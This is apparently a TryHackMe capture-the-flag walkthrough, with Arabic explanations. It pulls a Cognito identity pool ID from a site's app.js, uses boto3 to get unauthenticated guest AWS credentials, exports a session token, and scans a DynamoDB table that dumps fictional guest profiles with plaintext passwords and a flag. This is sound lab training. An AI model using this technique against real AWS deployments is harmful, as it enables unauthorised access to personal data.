# Complimentary Walktherough

----

 ## open website sourcecode 

<img width="1552" height="527" alt="image" src="https://github.com/user-attachments/assets/7341ed3b-843d-4fea-becd-fae06b04b35c" />

## let's discover `app.js`

<img width="1835" height="759" alt="image" src="https://github.com/user-attachments/assets/65abb3b1-3a86-48e1-b505-3fa88ba0d3b5" />

```python

import boto3
import json

identity_pool_id = "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688"
region = "us-east-1"

# Get credentials using Cognito
client = boto3.client('cognito-identity', region_name=region)

# Get identity ID
identity_response = client.get_id(
    IdentityPoolId=identity_pool_id
)
identity_id = identity_response['IdentityId']
print(f"Identity ID: {identity_id}")

# Get credentials
creds_response = client.get_credentials_for_identity(
    IdentityId=identity_id
)
creds = creds_response['Credentials']
print(f"Access Key: {creds['AccessKeyId']}")
print(f"Secret Key: {creds['SecretKey']}")
print(f"Session Token: {creds['SessionToken']}")
print(f"Expiration: {creds['Expiration']}")
                                                                                                                                                                                       

```

<details>
  <summary>explain code</summary>

من الـ `app.js` إحنا عرفنا إن الموقع بيستخدم **AWS Cognito Identity Pool**:

```
const IDENTITY_POOL_ID = "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688";

AWS.config.credentials = new AWS.CognitoIdentityCredentials({
  IdentityPoolId: IDENTITY_POOL_ID,
});
```

معنى الكلام ده إن أي زائر للموقع يقدر ياخد **Guest Credentials** من AWS بدون تسجيل دخول.

* * * * *

الموقع بيجيب الـ Credentials إزاي؟
----------------------------------

لما المتصفح ينفذ:

```
AWS.config.credentials.get()
```

الـ AWS SDK بيعمل في الخلفية تقريبًا خطوتين:

### 1\. GetId

يبعت لـ Cognito:

```
client.get_id(
    IdentityPoolId=identity_pool_id
)
```

فيرجع:

```
{
  "IdentityId": "us-east-1:xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
}
```

وده مجرد معرف للضيف.

* * * * *

### 2\. GetCredentialsForIdentity

بعد ما عرف الـ IdentityId:

```
client.get_credentials_for_identity(
    IdentityId=identity_id
)
```

Cognito بيرجع:

```
{
  "Credentials": {
    "AccessKeyId": "...",
    "SecretKey": "...",
    "SessionToken": "...",
    "Expiration": "..."
  }
}
```

ودي credentials مؤقتة.

* * * * *

ليه قدرنا تجيبهم؟
--------------------

لأن الـ Identity Pool معمول له:

```
Allow unauthenticated identities = TRUE
```

يعني أي حد يعرف:

```
us-east-1:836c0949-292d-485b-b532-52d5ca7bb688
```

يقدر يطلب Guest Credentials.

وده بالضبط اللي سكربتك عمله.

* * * * *

يعني إيه Access Key و Secret Key؟
---------------------------------

دي بيانات AWS بتستخدم للتوقيع على الطلبات.

مثال:

```
AccessKeyId
ASIA...
```

زي اسم المستخدم.

* * * * *

```
SecretKey
xxxxxxxx
```

زي الباسورد.

* * * * *

```
SessionToken
xxxxxxxx
```

توكن إضافي لأن الكريدنشالز مؤقتة.

  
</details>

<img width="1680" height="335" alt="image" src="https://github.com/user-attachments/assets/d85d8169-0aa4-4707-a301-74491fd1be11" />

---

```
export AWS_ACCESS_KEY_ID="......"
export AWS_SECRET_ACCESS_KEY="..................."
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjECcaCXVzLWVhc3QtMSJHMEUCIC/kwY9SjUTw9WBwOr2Bo1+/WwCaT4MngHqVS0CjssgKAiEAzUrOn145G4VRbDLdvfHM++VtvSj46eF8q7vxA3cN1Z0quAUI8P//////////ARAAGgwzMzIxNzMzNDcyNDgiDLQRYj9gRfjh+DjqmyqMBcpHo0AxXBAnm6aT+1t0OxZATaHZKt4X7K3nmMaTshuVE1+kopIgcVscP36Hi3IK5H/HdiW+S4nfwl+64G88mnWL5bZvr9F1A5OiWK9fOUMyqMNdiFpzr387hCxPq4cuIkKH0VIRBy8oSz425qwcDDcLSKQ2gOpc53jZKox5tQXdXMWcuizxUOLsfATvwSYFSDbToz6Zb8J13SRbGPPXQb8mPMEUtcUPNUfQh4CvJd5R/atEVG1z97PZdxD+M8qcCx4yvjnbedwLP76x/BRu60LaUyOLipyUsViXXdn9s7xUDEIXYHKc2KStV4cu9K9S9CRVY/s2c/K/nFZLZgRyPN1LxwSnF7xz/lniRaQ2QHGdlLp4XeisxCCy1DkT0uBCDpJDrcfxvJSCEz3IlS4tlc0A6E6ARZ9yNwwZqiGlxG1+j3ZdI00Z+uJE1i4081oNtBogxlPVeSo8orB0CELO2MuacSmB4yVpB6sETl3GqrwsghPGeCeFQJhsjxw5O4P2oDjAq3euN0QuDFp3apeVyuUoxIJ+6bq+J5tBBH1JSb+RpwL33nDfizbE2mEtpJbxWLujRTG+cSe7GSW3vLl9Y2bB9qaZ+ejVFxMw6IiaaiKCKhgWtg6TkeGG8JIW6CSio8YZ45oR1qU8luJOuueq/lAZKJSanN9dDX8BlTmiyz1DfeCWKauRDkDEj6YLUgm0OINvPXmhvUgeuHL0f3ZvmkT8zoCUytGu2xjsMTqIu2aFdmabSe0dsbAQKyPVpvyzs0GZrSNag/UoeeaUkCn3n5vPZtvnX3/enjJd8BvQigEOw+I+th0WYsCGZqsWNztmUWmI4mqs/j19ISwszn8Ygl1tGayVhancgJgEYngwivDA0wY63QLPQO3OnlHZx4BtPH/IioeEQxmmk4Zrm4/8CQv8meBNbLc+ofGLc/iWubeIOwjnfrY3URcV86qLKuthGOkmKU6x3yah7Tv7ND9vbEKfXGBk+cKtsM50EtU9ITl9OuWufSkTUsD6tqOyXoaLEkeMLNPpijOfifUuQeEKBt6DuF1eY690KRxAfM2Gd4SW1D58M8WBHQZYXmWPak1E5bQxrjwq9Zg+xPCBD4ZEWrSkR10KNyJgU+HTUGOyPgabfGzjOEM8+Vf+F0CgSqNGxdPzYHB61tsGFUUn9UqywL56ASVsERyFrYqiHwf0Lb3N+dh002ZBU7NmLhhmBMTVaQwMq5VDAbtdNnQoJ0vsUgY6fPuxTGN1GesUU1/U8Advc4M3BG/BpgbiOmc+kSo8t0nty1dHAP8DQhEXBVRVc4GJqIQ7oAoc4MjwhbC81DhkwC3ViebcSBEdyTY8/+h0Gwu0"
export AWS_DEFAULT_REGION="us-east-1"
```

## now run 

```
aws dynamodb scan --table-name complimentary-GuestWellnessProfiles --region us-east-1
```

```
──(myenv)─(kali㉿kali)-[~/tryhackme/Complimentary]
└─$ aws dynamodb scan --table-name complimentary-GuestWellnessProfiles --region us-east-1
{
    "Items": [
        {
            "password": {
                "S": "digitaldetox2026"
            },
            "location": {
                "S": "25.2055,55.2733"
            },
            "notes": {
                "S": "Booked the quiet room for his \"digital detox.\" Checked email twice since writing that."
            },
            "guest_id": {
                "S": "guest-vibe"
            },
            "email": {
                "S": "vibe@hackerholidays.thm"
            },
            "phone": {
                "S": "+1-555-0193"
            },
            "name": {
                "S": "Vibe (Move Fast & Break Things)"
            }
        },
        {
            "password": {
                "S": "sunkissed88"
:...skipping...
{                                                                                                                                                                                                             
    "Items": [                                                                                                                                                                                                
        {                                                                                                                                                                                                     
            "password": {                                                                                                                                                                                     
                "S": "digitaldetox2026"                                                                                                                                                                       
            },                                                                                                                                                                                                
            "location": {
                "S": "25.2055,55.2733"
            },
            "notes": {
                "S": "Booked the quiet room for his \"digital detox.\" Checked email twice since writing that."
            },
            "guest_id": {
                "S": "guest-vibe"
            },
            "email": {
                "S": "vibe@hackerholidays.thm"
            },
            "phone": {
                "S": "+1-555-0193"
            },
            "name": {
                "S": "Vibe (Move Fast & Break Things)"
            }
        },
        {
            "password": {
                "S": "sunkissed88"
            },
            "location": {
                "S": "25.2048,55.2708"
            },
            "notes": {
                "S": "Posted 47 times in three days. Wants everything tagged #ByteLotus for the algorithm."
:...skipping...
{                                                                                                                                                                                                                                           
    "Items": [                                                                                                                                                                                                                              
        {                                                                                                                                                                                                                                   
            "password": {
                "S": "digitaldetox2026"
            },
            "location": {
                "S": "25.2055,55.2733"
            },
            "notes": {
                "S": "Booked the quiet room for his \"digital detox.\" Checked email twice since writing that."
            },
            "guest_id": {
                "S": "guest-vibe"
            },
            "email": {
                "S": "vibe@hackerholidays.thm"
            },
            "phone": {
                "S": "+1-555-0193"
            },
            "name": {
                "S": "Vibe (Move Fast & Break Things)"
            }
        },
        {
            "password": {
                "S": "sunkissed88"
            },
            "location": {
                "S": "25.2048,55.2708"
            },
            "notes": {
                "S": "Posted 47 times in three days. Wants everything tagged #ByteLotus for the algorithm."
            },
            "guest_id": {
                "S": "guest-lambo"
:...skipping...
{                                                                                                                                                                                                                                           
    "Items": [                                                                                                                                                                                                                              
        {                                                                                                                                                                                                                                   
            "password": {
                "S": "digitaldetox2026"
            },
            "location": {
                "S": "25.2055,55.2733"
            },
            "notes": {
                "S": "Booked the quiet room for his \"digital detox.\" Checked email twice since writing that."
            },
            "guest_id": {
                "S": "guest-vibe"
            },
            "email": {
                "S": "vibe@hackerholidays.thm"
            },
            "phone": {
                "S": "+1-555-0193"
            },
            "name": {
                "S": "Vibe (Move Fast & Break Things)"
            }
        },
        {
            "password": {
                "S": "sunkissed88"
            },
            "location": {
                "S": "25.2048,55.2708"
            },
            "notes": {
                "S": "Posted 47 times in three days. Wants everything tagged #ByteLotus for the algorithm."
            },
            "guest_id": {
                "S": "guest-lambo"
            },
            "email": {
                "S": "lambo@hackerholidays.thm"
            },
            "phone": {
                "S": "+1-555-0142"
            },
            "name": {
                "S": "Lambo (@0xMia)"
            }
        },
        {
            "password": {
                "S": "escalation_only"
            },
            "location": {
                "S": "25.2048,55.2708"
            },
            "notes": {
                "S": "If you're reading this, the wellness app's guest role can read every profile, not just its own. THM{fr33_app_fr33_d4t4!}"
            },
            "guest_id": {
                "S": "guest-vip-042"
            },
            "email": {
                "S": "vip042@hackerholidays.thm"
            },
            "phone": {
                "S": "+1-555-0100"
            },
            "name": {
                "S": "Guest VIP-042"
            }
        },
        {
            "password": {
                "S": "haveyoutriedrestarting"
            },
            "location": {
                "S": "25.2030,55.2690"
            },
            "notes": {
                "S": "Filed three tickets about this app. All closed as \"resolved\" by VERA."
            },
            "phone": {
                "S": "+1-555-0142"
            },
            "name": {
                "S": "Lambo (@0xMia)"
            }
        },
        {
            "password": {
                "S": "escalation_only"
            },
            "location": {
                "S": "25.2048,55.2708"
            },
            "notes": {
                "S": "If you're reading this, the wellness app's guest role can read every profile, not just its own. THM{fr33_app_fr33_d4t4!}"
            },
            "guest_id": {
                "S": "guest-vip-042"
            },
            "email": {
                "S": "vip042@hackerholidays.thm"
            },
            "phone": {
                "S": "+1-555-0100"
            },
            "name": {
                "S": "Guest VIP-042"
            }
        },
        {
            "password": {
                "S": "haveyoutriedrestarting"
            },
            "location": {
                "S": "25.2030,55.2690"
            },
            "notes": {
                "S": "Filed three tickets about this app. All closed as \"resolved\" by VERA."
            },
            "guest_id": {
                "S": "guest-patch"
            },
            "email": {
                "S": "patch@hackerholidays.thm"
            },
            "phone": {
                "S": "+1-555-0159"
            },
            "name": {
                "S": "Patch (Have You Tried Turning It Off)"
            }
        },
        {
            "password": {
                "S": "notmykeys1"
            },
            "location": {
                "S": "25.2011,55.2701"
            },
            "notes": {
                "S": "Checks his portfolio 34 times a day. Brought three devices for \"redundancy.\""
            },
            "guest_id": {
                "S": "guest-ponzi"
            },
            "email": {
                "S": "ponzi@hackerholidays.thm"
            },
            "phone": {
                "S": "+1-555-0187"
            },
            "name": {
                "S": "Ponzi (Satoshi_Probably)"
            }
        }
    ],
    "Count": 5,
    "ScannedCount": 5,
    "ConsumedCapacity": null
}
(END)

```

